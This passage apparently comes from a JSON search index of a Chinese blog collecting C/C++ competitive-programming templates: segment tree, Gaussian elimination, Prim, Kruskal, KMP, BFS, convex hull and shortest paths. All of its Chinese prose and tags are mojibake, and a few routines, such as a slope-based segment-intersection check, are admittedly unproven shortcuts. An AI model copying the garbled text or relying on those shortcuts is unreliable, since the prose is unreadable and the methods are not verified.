mid); if (e\u003e mid) update(rt\u003c\u003c1|1, s, e, mid+1, r); st[rt] = st[rt\u003c\u003c1] + st[rt\u003c\u003c1|1]; } int query(int rt, int s, int e, int l, int r) { if (s \u003c= l \u0026\u0026 r \u003c= e) return st[rt]; int ans = 0, mid = (l+r) \u003e\u003e 1; if (add[rt]) pushdown(rt, l, r); if (s \u003c= mid) ans += query(rt\u003c\u003c1, s, e, l, mid); if (e\u003e mid) ans += query(rt\u003c\u003c1|1, s, e, mid+1, r); return ans; } int main() { scanf(\"%d%d\", \u0026n, \u0026m); for (int i = 0; i \u003c m; ++i) { scanf(\"%d%d%d\", \u0026flag, \u0026s, \u0026e); if (flag) printf(\"%d\\n\", query(1, s, e, 1, n)); else update(1, s, e, 1, n); } return 0; } ","date":"2018-02-05","objectID":"/templates/:1:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"æœ€å¤§è¿ç»­å­åºåˆ—çš„å’Œ ç”±äºè¦è®©å’Œæœ€å¤§ï¼Œå¯ä»¥ç›´æ¥å±è”½æ‰å’Œä¸ºè´Ÿæ•°çš„æƒ…å†µ (tot \u003c 0)ï¼Œä½†æ˜¯ç”±äºæ±‚çš„æ˜¯è¿ç»­å­åºåˆ—çš„å’Œï¼Œä¸èƒ½ä¸€é‡åˆ°è´Ÿæ•°çš„é¡¹å°±æ‰”æ‰ã€‚å¦‚ï¼š5 6 -1 5 4 -7ï¼Œæœ€å¤§è¿ç»­å­åºåˆ—å’Œä¸º 6+(-1)+5+4=14ã€‚ ç„¶åç”¨ tot æ›´æ–° ans å°±è¡Œäº†ã€‚ #include \u003cstdio.h\u003e int main() { int cas, i, n; scanf(\"%d\", \u0026cas); while (cas--){ scanf(\"%d\", \u0026n); int a[100] = {0}; for (i = 0; i \u003c n; ++i) scanf(\"%d\", \u0026a[i]); int ans = a[0], tot = 0; for (i = 0; i \u003c n; ++i){ if (tot\u003e 0) tot += a[i]; else tot = a[i]; if (tot\u003e ans) ans = tot; } printf(\"%d\\n\", ans); } return 0; } ","date":"2018-02-05","objectID":"/templates/:2:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"é«˜æ–¯æ¶ˆå…ƒæ±‚è¡Œåˆ—å¼åŠé€†çŸ©é˜µ ç»™å®šä¸€ä¸ª n*n çš„çŸ©é˜µï¼Œè¾“å‡ºå®ƒçš„è¡Œåˆ—å¼å€¼å’Œé€†çŸ©é˜µï¼ˆä¿è¯å­˜åœ¨ï¼‰ã€‚ æœŸæœ«å¤ä¹ çº¿æ€§ä»£æ•°æ—¶ï¼Œå‘ç°è‡ªå·±æ±‚é€†çŸ©é˜µæ€»æ˜¯æ±‚é”™ï¼Œäºæ˜¯å¹²è„†å†™äº†ä¸ªç¨‹åºæ¥å®ç°ã€‚ã€‚ é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„åªè¦ç¨å¾®ä¿®æ”¹ä¸‹ä»£ç å°±å¯ä»¥ï¼Œåˆ¤æ–­æ— è§£ / æ— ç©·å¤šè§£ä¹Ÿä¸éš¾ï¼Œè‡³äºæ±‚è‡ªç”±æœªçŸ¥é‡ç„¶åè¾“å‡ºä»»æ„ä¸€è§£â€¦â€¦ è¿˜æ²¡æœ‰æƒ³å¥½ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const double eps = 1e-6; const int N = 12; void gauss(double a[][N], double b[], double x[], int n) { int i; double s; for (int k = 1; k \u003c= n; ++k) { for (i = k; i \u003c= n \u0026\u0026 fabs(a[i][k]) \u003ceps; ++i); if (i != k) { for (int j = k; j \u003c= n; ++j) swap(a[i][j], a[k][j]); swap(b[i], b[k]); } for (i = k+1; i \u003c= n; ++i) { s = a[i][k] / a[k][k]; for (int j = k; j \u003c= n; ++j) a[i][j] -= a[k][j] * s; b[i] -= b[k] * s; } } for (i = n; i\u003e= 1; --i) { s = b[i]; for (int j = i+1; j \u003c= n; ++j) s -= x[j] *a[i][j]; x[i] = s / a[i][i]; if (fabs(x[i]) \u003ceps) x[i] = 0; } } int main() { double a[N][N], b[N], x[N], mt[N][N], mk[N][N]; int n; cin \u003e\u003e n; for (int i = 1; i \u003c= n; ++i) { for (int j = 1; j \u003c= n; ++j) { cin \u003e\u003e mk[i][j]; a[i][j] = mk[i][j]; } b[i] = 0; } gauss(a, b, x, n); double det = 1; for (int i = 1; i \u003c= n; ++i) det *= a[i][i]; if (fabs(det) \u003ceps) det = 0; printf(\"%0.2f\\n\", det); for (int k = 1; k \u003c= n; ++k) { for (int i = 1; i \u003c= n; ++i) { for (int j = 1; j \u003c= n; ++j) a[i][j] = mk[i][j]; b[i] = 0; } b[k] = 1; gauss(a, b, x, n); for (int i = 1; i \u003c= n; ++i) mt[i][k] = x[i]; } for (int i = 1; i \u003c= n; ++i) { for (int j = 1; j \u003c n; ++j) printf(\"%0.2f\", mt[i][j]); printf(\"%0.2f\\n\", mt[i][n]); } return 0; } ","date":"2018-02-05","objectID":"/templates/:3:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"è®¡ç®—ä¸¤ä¸ªä¸€å…ƒå¤šé¡¹å¼çš„ä¹˜ç§¯ ç®—æ˜¯é«˜ç²¾åº¦ä¹˜æ³•ï¼Ÿ ç»†èŠ‚æ¯”è¾ƒå¤šã€‚é™å¹‚è¾“å‡ºéé›¶ç³»æ•°ã€‚ #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cctype.h\u003e#define N 100 void readpoly(char *s, int* poly) { while (*s){ int sign = 1, a = 0, i = 0; if (*s =='+') ++s; else if (*s =='-') sign = -1, ++s; while (isdigit(*s)){ a = a * 10 + *s -'0'; ++s; } if (a == 0) a = 1; if (*s !='x') {poly[0] = a * sign; return;} else ++s; if (*s =='^') ++s; while (isdigit(*s)) { i = i * 10 + *s - '0'; ++s; } if (i == 0) i = 1; poly[i] = a * sign; } } void multiply(char *s1,char *s2, int* poly) { int poly1[N] = {0}, poly2[N] = {0}, i, j; readpoly(s1, poly1); readpoly(s2, poly2); for (i = 0; i \u003c N / 2; ++i) for (j = 0; j \u003c N / 2; ++j) poly[i + j] += poly1[i] * poly2[j]; } int main() { char s1[N+1], s2[N+1]; while(scanf(\"%s%s\", s1, s2) != EOF){ int poly[N] = {0}, out[N], n = 0, i; multiply(s1, s2, poly); for (i = 0; i \u003c N; ++i) if (poly[i]) out[n++] = poly[i]; for (i = n - 1; i\u003e= 0; --i){ printf(\"%d\", out[i]); i ? printf(\"\") : printf(\"\\n\"); } } return 0; } ","date":"2018-02-05","objectID":"/templates/:4:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"Prim(EOJ 3199) #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 105; const int INF = 0x3f3f3f3f; int mp[maxn][maxn], dis[maxn], vis[maxn], n, sum; inline int prim() { memset(vis, 0, sizeof vis); memset(dis, INF, sizeof dis); sum = dis[1] = 0; for (;;) { int u = -1, v, mincost = INF; for (int i = 1; i \u003c= n; ++i) if (dis[i] \u003cmincost \u0026\u0026 !vis[i]) { mincost = dis[i]; u = i; } if (u == -1) break; vis[u] = 1; sum += dis[u]; for (v = 1; v \u003c= n; ++v) if (dis[v] \u003e mp[u][v]) dis[v] = mp[u][v]; } return sum; } int main() { while (cin\u003e\u003e n) { memset(mp, INF, sizeof mp); for (int i = 1; i \u003c= n; ++i) for (int j = 1; j \u003c= n; ++j) scanf(\"%d\", \u0026mp[i][j]); printf(\"%d\\n\", prim()); } return 0; } ","date":"2018-02-05","objectID":"/templates/:5:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"Kruskal(EOJ 3201) n ä¸ªç‚¹ï¼Œm æ¡è¾¹çš„å›¾ï¼Œè¦ä½¿å¾—å›¾ä¸­æ²¡æœ‰åœˆï¼Œæ±‚è¦å»æ‰çš„è¾¹çš„æƒå€¼å’Œçš„æœ€å°å€¼ã€‚ æ±‚å›¾çš„æœ€å¤§ç”Ÿæˆæ ‘ï¼Œç”¨æ€»æƒå€¼å‡ç”Ÿæˆæ ‘æƒå€¼å¾—åˆ°ç­”æ¡ˆã€‚ä¼¼ä¹æ˜¯åªèƒ½ç”¨ Kruskal åšã€‚è¾¹æ•°ç»„åº”è¯¥æ˜¯è¦å¼€åˆ° 10000 * 10000 / 2 çš„ï¼Œæ²¡æƒ³åˆ° EOJ ä¸Šæäº¤ RTEï¼Œæ”¹æˆ 10000 * 100 å°±å¥½äº†â€¦â€¦ #include \u003cbits/stdc++.h\u003eusing namespace std; #define maxn 11000 struct edge { int u, v; double w; }g[maxn*100]; struct node { double x, y; }point[maxn]; double sum; int n, m, fa[maxn]; inline double dis(const node\u0026 a, const node\u0026 b) { return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y)); } bool cmp(const edge\u0026 a, const edge\u0026 b) { return a.w \u003e b.w; } inline int find(int x) { return x == fa[x] ? x : fa[x] = find(fa[x]); } inline double kruskal() { sort(g, g+m, cmp); double remain = 0.0; for (int i = 0; i \u003c m; ++i) { int x = find(g[i].u), y = find(g[i].v); if (x != y) { fa[x] = y; remain += g[i].w; }else continue; } return sum - remain; } int main() { int u, v; cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; ++i) fa[i] = i; for (int i = 1; i \u003c= n; ++i) scanf(\"%lf%lf\", \u0026point[i].x, \u0026point[i].y); for (int i = 0; i \u003c m; ++i) { scanf(\"%d%d\", \u0026u, \u0026v); g[i].u = u; g[i].v = v; g[i].w = dis(point[u], point[v]); sum += g[i].w; } printf(\"%.6f\\n\", kruskal()); return 0; } ","date":"2018-02-05","objectID":"/templates/:6:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"KMP å¯¹äºä¸€ä¸ªç»™å®šçš„å­—ç¬¦ä¸² sï¼Œå”çº³å¾·ç»™å‡º q æ¬¡è¯¢é—®ï¼Œç¬¬ i æ¬¡è¯¢é—®åŒ…æ‹¬ä¸‰ä¸ªå‚æ•° li,ri,ziï¼Œé—®åœ¨ s[liâ€¦ri] çš„æ‰€æœ‰å­ä¸²ä¸­å…±æœ‰å¤šå°‘ä¸ªæ°å¥½ä¸º ziã€‚ 1â‰¤|s|â‰¤100, qâ‰¤âˆ‘|zi|â‰¤100 å‘ç‚¹åœ¨äºå¯é‡å¤ã€‚ã€‚æ¯”èµ›æ—¶ç”¨ Python çš„åˆ‡ç‰‡æ°´è¿‡å»äº†ï¼Œåæ¥å‘ç° C++ ç”¨ string çš„ substr å’Œ find æ–¹æ³•ä¹Ÿä¸éš¾å†™ï¼Œè¿™é‡Œä»…è®°å½•ä¸€ä¸‹åˆšå­¦çš„ KMP è§£æ³•ã€‚ è¯´å®è¯ï¼ŒKMP åˆå­¦èµ·æ¥æ˜¯æœ‰äº›ç»•ï¼Œä¸è¿‡æ‰¾ç‚¹ä¾‹å­ï¼Œè€å¿ƒç”»å‡ ä¸ªå›¾å¾ˆå¿«å°±èƒ½ç†è§£äº†ã€‚è¿™ä¸ªç®—æ³•æ¯”è¾ƒæœ‰è¶£çš„æ˜¯æ±‚ next æ•°ç»„æ—¶ä¹Ÿæ˜¯ç”¨çš„ KMPï¼Œæœ‰ç§è‡ªæ´½çš„æ„Ÿè§‰ã€‚æ®è¯´å®é™…ä¸Šï¼Œåº“å‡½æ•° strstr å’Œ KMP æ•ˆç‡å·®ä¸å¤šï¼ˆç”šè‡³æ›´å¿«ï¼Ÿï¼‰ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 1005; char s[maxn], t[maxn]; int nxt[maxn]; int q, l, r, len; inline void getnext() { nxt[0] = -1; for (int i = 1, j = -1; i \u003c len; ++i) { while (j\u003e -1 \u0026\u0026 t[j+1] != t[i]) j = nxt[j]; if (t[j+1] == t[i]) ++j; nxt[i] = j; } } inline int kmp() { getnext(); int ans = 0; for (int i = l, j = -1; i \u003c= r; ++i) { while (j\u003e -1 \u0026\u0026 t[j+1] != s[i]) j = nxt[j]; if (t[j+1] == s[i]) ++j; if (j == len-1) ++ans; } return ans; } int main() { scanf(\"%s%d\", s, \u0026q); while (q--) { scanf(\"%d%d %s\", \u0026l, \u0026r, t); len = strlen(t); printf(\"%d\\n\", kmp()); } return 0; } ","date":"2018-02-05","objectID":"/templates/:7:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"å¸¦è·¯å¾„è¿˜åŸçš„ BFS ç»™å®šä¸€ä¸ªè¿·å®«å’Œèµ·ç‚¹ç»ˆç‚¹ï¼Œæ±‚æœ€å¿«è¦å¤šå°‘æ­¥åˆ°ç»ˆç‚¹ä»¥åŠæœ€å¿«çš„è·¯å¾„ï¼Œä¸èƒ½åˆ°è¾¾è¾“å‡º -1ã€‚ æ˜¾ç„¶ bfsï¼Œä¹Ÿå› æ­¤éœ€è¦å¼€ä¸€ä¸ª step æ•°ç»„è®°å½•æ­¥æ•°ï¼Œæ›´æ–°æ²¡æœ‰èµ°è¿‡çš„ç‚¹çš„ stepã€‚è·¯å¾„è¿˜åŸåˆ™åˆéœ€è¦ä¸€ä¸ªæ•°ç»„è®°å½•è¿™ä¸€æ­¥çš„ä¸Šä¸€ä¸ªç‚¹ï¼Œè¿˜åŸæ—¶ä»åå¾€å‰é€’å½’è¾“å‡ºå³å¯ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 205; int n, m, sx, sy, ex, ey, ans; char mp[maxn][maxn]; int step[maxn][maxn]; const int dx[] = {1,-1,0,0}; const int dy[] = {0,0,1,-1}; struct node { int x, y; }a[maxn][maxn]; inline bool in(int x, int y) { return x\u003e=0 \u0026\u0026 x\u003cn \u0026\u0026 y\u003e=0 \u0026\u0026 y\u003cn; } inline void bfs() { queue\u003cnode\u003e q; node u, v; int now = 0; u.x = sx; u.y = sy; q.push(u); while (!q.empty()) { u = q.front(); q.pop(); now = step[u.x][u.y]; for (int i = 0; i \u003c 4; ++i) { v.x = u.x+dx[i]; v.y = u.y+dy[i]; if (in(v.x, v.y) \u0026\u0026 mp[v.x][v.y]=='.' || mp[v.x][v.y] == 'E') if (!step[v.x][v.y]) { a[v.x][v.y].x = u.x; a[v.x][v.y].y = u.y; step[v.x][v.y] = now+1; if (mp[v.x][v.y] == 'E') { ans = step[v.x][v.y]; return; } q.push(v); } } } } inline void dfs(int x, int y) { if (x!=sx || y!=sy) dfs(a[x][y].x, a[x][y].y); printf(\"%d %d\\n\", x, y); } int main() { cin \u003e\u003e n \u003e\u003e m; cin.get(); for (int i = 0; i \u003c n; ++i) { scanf(\"%s\", mp[i]); for (int j = 0; j \u003c m; ++j) if (mp[i][j] == 'S') { sx = i; sy = j; }else if(mp[i][j] == 'E') { ex = i; ey = j; } } memset(step, 0, sizeof step); bfs(); if (ans) { printf(\"%d\\n\", ans); dfs(ex, ey); }else printf(\"-1\\n\"); return 0; } ","date":"2018-02-05","objectID":"/templates/:8:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"åˆ¤æ–­ä¸¤æ¡çº¿æ®µæ˜¯å¦ç›¸äº¤ åŒ…æ‹¬äº†ä¸€ä¸ªæˆ–å¤šä¸ªç‚¹é‡åˆçš„æƒ…å†µã€‚ è¾“å…¥ç‚¹çš„åæ ‡é¡ºåºä¸º Ax,Ay,Bx,By,Cx,Cy,Dx,Dyï¼Œåˆ¤æ–­çº¿æ®µ AB ä¸çº¿æ®µ CD æ˜¯å¦ç›¸äº¤ã€‚ ç”±äºé—®é¢˜æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ç”¨åˆ°å‘é‡ã€å‰ç§¯ä»€ä¹ˆçš„ï¼Œè€Œæ˜¯ç”¨äº†å¥‡æ€ªçš„ä½œå›¾æ³• + ä¸è¯æ˜ç›´æ¥æ¨å¹¿æ³•ï¼ˆï¼Ÿï¼‰ã€‚ å¯ä»¥ç”»ä¸ªå›¾éªŒè¯ä¸€ä¸‹ã€‚å¯¹äºç¨éš¾çš„è®¡ç®—å‡ ä½•é¢˜ï¼Œè¿™äº›å¥‡æŠ€æ·«å·§å°±æ²¡æœ‰ç”¨äº†ã€‚ #include \u003cstdio.h\u003e int main() { int x1, y1, x2, y2, x3, y3, x4, y4; while (~scanf(\"%d%d%d%d%d%d%d%d\", \u0026x1, \u0026y1, \u0026x2, \u0026y2, \u0026x3, \u0026y3, \u0026x4, \u0026y4)){ double k = 1.0 * (y1 - y2) / (x1 - x2); double n = y1 - k * x1; double ans1 = k * x3 + n, ans2 = k * x4 + n; if ((ans1 \u003c= y3 \u0026\u0026 ans2\u003e= y4) || (ans1\u003e= y3 \u0026\u0026 ans2 \u003c= y4)) printf(\"Yes\\n\"); else printf(\"No\\n\"); } return 0; } ","date":"2018-02-05","objectID":"/templates/:9:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"è®¡ç®—å¤šè¾¹å½¢é¢ç§¯ æˆ‘ä»¬å‡å®šå¾—åˆ°äº†æŒ‰ç…§é€†æ—¶é’ˆé¡ºåºç»™å‡ºçš„ n ä¸ªé¡¶ç‚¹çš„åæ ‡ x1, y1, x2, y2 ... xn, yn ä¸”åæ ‡å‡ä¸ºæ•´æ•°ã€‚ é‚£ä¹ˆæœ€ç®€æ´çš„æ–¹æ³•å°±æ˜¯è®¡ç®—å‘é‡å‰ç§¯ï¼ˆå…¶å®ä¹Ÿæ˜¯ç®—è¡Œåˆ—å¼ï¼‰æ¥æ±‚ï¼Œå¯¹å‡¹å¤šè¾¹å½¢ä¹Ÿé€‚ç”¨ã€‚ç›´è§‚çš„ç†è§£æ˜¯å°†å¤šè¾¹å½¢åˆ†ä¸ºäº†è‹¥å¹²ä¸ªå°ä¸‰è§’å½¢åˆ†åˆ«æ±‚é¢ç§¯ã€‚ #include \u003ciostream\u003e#include \u003ccstdio\u003e#include \u003ccmath\u003eusing namespace std; int main(void) { int n, i, x[101], y[101]; double sum; while(cin\u003e\u003e n \u0026\u0026 n){ for (i = 0; i \u003c n; ++i) cin \u003e\u003e x[i] \u003e\u003e y[i]; sum = 0; for (i = 0; i \u003c n - 1; ++i) sum += (x[i] * y[i + 1] - x[i + 1] * y[i]); sum = (fabs(sum + x[i] * y[0] - x[0] * y[i])) * 1.0 / 2; printf(\"%.1f\\n\", sum); } } ","date":"2018-02-05","objectID":"/templates/:10:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"åˆ¤æ–­çº¿æ®µæ˜¯å¦ä¸çŸ©å½¢ç›¸äº¤ è¾“å…¥æ ¼å¼ï¼š xstart ystart xend yend xleft ytop xright ybottom Note: The terms top left and bottom right do not imply any ordering of coordinates. è®¡ç®—å‡ ä½•é¢˜å¯¹æˆ‘æ¥è¯´ï¼Œå…‰æ˜¯å†™å¯¹å°±è¦èŠ±å¾ˆä¹…ï¼Œè€Œä»£ç è¿˜è¦åšåˆ°æ—¢ç®€æ´åˆæ˜“æ‡‚çœŸæ˜¯éš¾ä¸ŠåŠ éš¾â€¦â€¦ æ³¨æ„ç‚¹åœ¨äºï¼šçº¿æ®µä¸çŸ©å½¢ä¸ç›¸äº¤ï¼Œè¿™æ„å‘³ç€çº¿æ®µä¸ä»…å¯ä»¥åœ¨çŸ©å½¢å¤–ï¼Œè¿˜å¯ä»¥åœ¨çŸ©å½¢å†…ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; int main() { int t, x1, y1, x2, y2, xl, yt, xr, yb; int a, b, c, f1, f2, f3, f4; cin \u003e\u003e t; while (t--) { scanf(\"%d%d%d%d%d%d%d%d\", \u0026x1, \u0026y1, \u0026x2, \u0026y2, \u0026xl, \u0026yt, \u0026xr, \u0026yb); if (xl\u003e xr) swap(xl, xr); if (yt \u003c yb) swap(yt, yb); a = y1 - y2; b = x2 - x1; c = x1 * y2 - y1 * x2; f1 = a * xl + b * yb + c; f2 = a * xl + b * yt + c; f3 = a * xr + b * yb + c; f4 = a * xr + b * yt + c; if ((f1\u003e0 \u0026\u0026 f2\u003e0 \u0026\u0026 f3\u003e0 \u0026\u0026 f4\u003e0) || (f1\u003c0 \u0026\u0026 f2\u003c0 \u0026\u0026 f3\u003c0 \u0026\u0026 f4\u003c0)) printf(\"F\\n\"); else if ((x1\u003e xr \u0026\u0026 x2 \u003e xr) || (x1 \u003c xl \u0026\u0026 x2 \u003c xl)) printf(\"F\\n\"); else if ((y1\u003e yt \u0026\u0026 y2 \u003e yt) || (y1 \u003c yb \u0026\u0026 y2 \u003c yb)) printf(\"F\\n\"); else printf(\"T\\n\"); } return 0; } ","date":"2018-02-05","objectID":"/templates/:11:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"Graham æ±‚å‡¸åŒ… (EOJ 1189) ç»™å®šå¹³é¢ä¸Šçš„ n ä¸ªç‚¹åŠåŠå¾„ rï¼Œæ±‚åœ†çš„å‘¨é•¿ä¸å‡¸åŒ…å‘¨é•¿ä¹‹å’Œã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const double PI = acos(-1.0); const int maxn = 1005; struct point {int x, y;}p[maxn]; int s[maxn], top; inline int cross(point p0, point p1, point p2) { return (p1.x-p0.x) * (p2.y-p0.y) - (p1.y-p0.y) * (p2.x-p0.x); } inline double dis(point p1, point p2) { return sqrt((p2.x-p1.x)*(p2.x-p1.x) + (p2.y-p1.y)*(p2.y-p1.y)); } inline bool cmp(point p1, point p2) { int c = cross(p[0], p1, p2); if (c\u003e 0) return 1; else if (!c \u0026\u0026 dis(p[0], p1) \u003cdis(p[0], p2)) return 1; return 0; } inline void graham(int n) { s[0] = 0; if (n == 1) top = 0; else { s[1] = top = 1; if (n == 2) return; for (int i = 2; i \u003c n; ++i) { while (top \u0026\u0026 cross(p[s[top-1]], p[s[top]], p[i]) \u003c= 0) --top; s[++top] = i; } } } int main() { int n, r; double ans; while (cin\u003e\u003e n \u003e\u003e r) { scanf(\"%d%d\", \u0026p[0].x, \u0026p[0].y); point p0; p0.x = p[0].x; p0.y = p[0].y; int k = 0; for (int i = 1; i \u003c n; ++i) { scanf(\"%d%d\", \u0026p[i].x, \u0026p[i].y); if ((p0.y\u003ep[i].y) || ((p0.y==p[i].y)\u0026\u0026(p0.x\u003ep[i].x))) { p0.x = p[i].x; p0.y = p[i].y; k = i; } } p[k] = p[0]; p[0] = p0; sort(p+1, p+n, cmp); graham(n); ans = 2 * PI * r; for (int i = 0; i \u003c= top; ++i) ans += dis(p[s[i]], p[s[(i+1) % (top+1)]]); printf(\"%d\\n\", (int)(ans+0.5)); } return 0; } ","date":"2018-02-05","objectID":"/templates/:12:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"Dijkstra, Bellman-Ford \u0026\u0026 SPFA. ","date":"2018-02-04","objectID":"/shortest-path/:0:0","tags":["å›¾è®º","æ¨¡ç‰ˆ"],"title":"æœ€çŸ­è·¯é—®é¢˜","uri":"/shortest-path/"},{"categories":["ç®—æ³•"],"content":"EOJ 3196 Wormholes å…¶å®å°±æ˜¯åˆ¤æ–­å›¾ä¸­æ˜¯å¦æœ‰è´Ÿç¯â€¦â€¦SPFA æˆ–è€… Bellman-Ford åˆ¤è´Ÿç¯ã€‚å†™çš„æ—¶å€™è¿˜ä¸ä¼š SPFAï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„ Bellman-Fordã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int N = 505; const int M = 2550; const int INF = 1e6; int n, m, k, cnt, dis[N]; struct node {int u, v, w;}e[M\u003c\u003c1]; void add_edge(int uu, int vv, int ww) { e[cnt].u = uu; e[cnt].v = vv; e[cnt++].w = ww; } bool bellman_ford() { int i; for (i = 1; i \u003c= n; ++i) dis[i] = INF; for (i = 1; i \u003c n; ++i) { bool flag = 0; for (int j = 1; j \u003c= cnt; ++j) if (dis[e[j].v] \u003e dis[e[j].u] + e[j].w) { dis[e[j].v] = dis[e[j].u] + e[j].w; flag = 1; } if (!flag) break; } for (i = 1; i \u003c= cnt; ++i) if (dis[e[i].v] \u003e dis[e[i].u] + e[i].w) return 1; return 0; } int main() { int t, u, v, w; cin \u003e\u003e t; while (t--) { cin \u003e\u003e n \u003e\u003e m \u003e\u003e k; cnt = 1; while (m--) { cin \u003e\u003e u \u003e\u003e v \u003e\u003e w; add_edge(u, v, w); add_edge(v, u, w); } while (k--) { cin \u003e\u003e u \u003e\u003e v \u003e\u003e w; add_edge(u, v, -w); } cout \u003c\u003c(bellman_ford() ? \"YES\" : \"NO\") \u003c\u003c endl; } return 0; } ","date":"2018-02-04","objectID":"/shortest-path/:1:0","tags":["å›¾è®º","æ¨¡ç‰ˆ"],"title":"æœ€çŸ­è·¯é—®é¢˜","uri":"/shortest-path/"},{"categories":["ç®—æ³•"],"content":"EOJ 3202 Roadblocks æ±‚æ¬¡çŸ­è·¯çš„æ¨¡æ¿é¢˜ã€‚ç”¨ dist, dist2 åˆ†åˆ«ä¿å­˜æœ€çŸ­è·¯å’Œæ¬¡çŸ­è·¯ï¼Œç”¨ Dijkstra æ›´æ–°è¿™ä¸¤ä¸ªæ•°ç»„ï¼Œæœ€å dist2[n-1] å°±æ˜¯ç­”æ¡ˆã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int N = 5010; const int INF = 0x3f3f3f3f; int n, m, dist[N], dist2[N]; struct edge {int to, cost;}; typedef pair\u003cint, int\u003e P; vector\u003cedge\u003e g[N]; void dijkstra() { priority_queue\u003cP, vector\u003cP\u003e, greater\u003cP\u003e \u003e q; fill(dist, dist + n, INF); fill(dist2, dist2 + n, INF); dist[0] = 0; q.push(P(0, 0)); while (!q.empty()) { P p = q.top(); q.pop(); int v = p.second, d = p.first; if (dist2[v] \u003cd) continue; for (int i = 0; i \u003c g[v].size(); ++i) { edge \u0026e = g[v][i]; int d2 = d + e.cost; if (dist[e.to] \u003e d2) { swap(dist[e.to], d2); q.push(P(dist[e.to], e.to)); } if (dist2[e.to] \u003e d2 \u0026\u0026 dist[e.to] \u003cd2) { dist2[e.to] = d2; q.push(P(dist2[e.to], e.to)); } } } } int main() { int u, v, w; while (cin\u003e\u003e n 